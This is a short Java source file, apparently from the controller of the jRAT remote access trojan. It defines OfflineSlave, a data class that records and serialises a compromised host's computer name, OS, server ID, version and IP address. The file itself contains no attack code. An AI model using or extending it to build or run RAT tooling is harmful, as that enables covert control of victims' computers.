package se.jrat.client;

public class OfflineSlave {

	protected String computername;
	protected String longosname;
	protected String serverid;
	protected String version;
	protected String ip;
	
	public OfflineSlave(AbstractSlave slave) {
		this.computername = slave.getComputerName();
		this.longosname = slave.getLongOperatingSystem();
		this.serverid = slave.getServerID();
		this.version = slave.getVersion();
		this.ip = slave.getRawIP();
	}
	
	public OfflineSlave(String computername, String longosname, String serverid, String version, String ip) {
		this.computername = computername;
		this.longosname = longosname;
		this.serverid = serverid;
		this.version = version;
		this.ip = ip;
	}
	
	public static OfflineSlave fromString(String s) {
		String[] array = s.split(":");
		return new OfflineSlave(array[0], array[1], array[2], array[3], array[4]);
	}
	
	public static String toString(OfflineSlave slave) {
		StringBuilder sb = new StringBuilder();
		sb.append(slave.computername + ":");
		sb.append(slave.longosname + ":");
		sb.append(slave.serverid + ":");
		sb.append(slave.version + ":");
		sb.append(slave.ip + ":");
		
		return sb.toString();
	}

}
